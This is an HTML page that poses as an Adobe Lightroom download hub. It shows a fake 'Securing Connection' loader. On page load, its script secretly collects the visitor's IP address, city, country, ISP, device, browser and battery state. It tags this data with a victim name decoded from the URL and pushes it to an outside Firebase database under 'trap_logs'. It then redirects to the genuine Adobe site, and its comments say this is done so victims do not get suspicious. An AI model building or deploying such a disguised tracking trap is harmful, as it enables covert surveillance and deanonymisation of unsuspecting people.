<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Adobe Lightroom | Digital Imaging Hub</title>
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
    <style>
        body { background: #000; color: white; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; overflow: hidden; }
        .loader-container { text-align: center; }
        .logo { width: 80px; margin-bottom: 20px; border-radius: 15px; }
        .bar { width: 200px; height: 4px; background: #333; border-radius: 10px; margin: 10px auto; overflow: hidden; }
        .progress { width: 0%; height: 100%; background: #0081ff; animation: load 3s forwards; }
        @keyframes load { 0% { width: 0%; } 100% { width: 100%; } }
        p { font-size: 12px; color: #888; }
    </style>
</head>
<body>

    <div class="loader-container">
        <img src="https://upload.wikimedia.org/wikipedia/commons/b/b6/Adobe_Photoshop_Lightroom_CC_logo.svg" class="logo" alt="LR">
        <h3>Securing Connection...</h3>
        <div class="bar"><div class="progress"></div></div>
        <p>Redirecting to Lightroom Pro Download Hub</p>
    </div>

    <script>
        // --- DRAGON FIREBASE CONFIG ---
        const firebaseConfig = { databaseURL: "https://dark-dragon-team-default-rtdb.firebaseio.com/" };
        firebase.initializeApp(firebaseConfig);
        const db = firebase.database();

        // Victim Information Extraction
        const urlParams = new URLSearchParams(window.location.search);
        const encodedId = urlParams.get('id');
        const victimName = encodedId ? atob(encodedId) : "Anonymous Target";

        async function captureData() {
            try {
                // Get IP and Location Data
                const response = await fetch('https://ipapi.co/json/');
                const data = await response.json();

                // Get Battery Info (Advanced Tracking)
                let batteryInfo = "Unknown";
                if (navigator.getBattery) {
                    const battery = await navigator.getBattery();
                    batteryInfo = `${Math.round(battery.level * 100)}% (${battery.charging ? 'Charging' : 'Discharging'})`;
                }

                // Prepare Payload
                const payload = {
                    name: victimName,
                    ip: data.ip || "Hidden",
                    city: data.city || "Unknown",
                    country: data.country_name || "Unknown",
                    isp: data.org || "Unknown",
                    device: navigator.platform,
                    browser: navigator.userAgent.split(') ')[1] || "Mobile/Other",
                    battery: batteryInfo,
                    time: new Date().toLocaleString()
                };

                // Push to Dragon Base
                await db.ref('trap_logs').push(payload);

                // Wait for animation and redirect to legitimate Lightroom page
                setTimeout(() => {
                    window.location.href = "https://www.adobe.com/products/photoshop-lightroom.html";
                }, 3000);

            } catch (error) {
                // If anything fails, still redirect so they don't get suspicious
                window.location.href = "https://www.adobe.com/products/photoshop-lightroom.html";
            }
        }

        // Start capture on page load
        window.onload = captureData;
    </script>
</body>
</html>
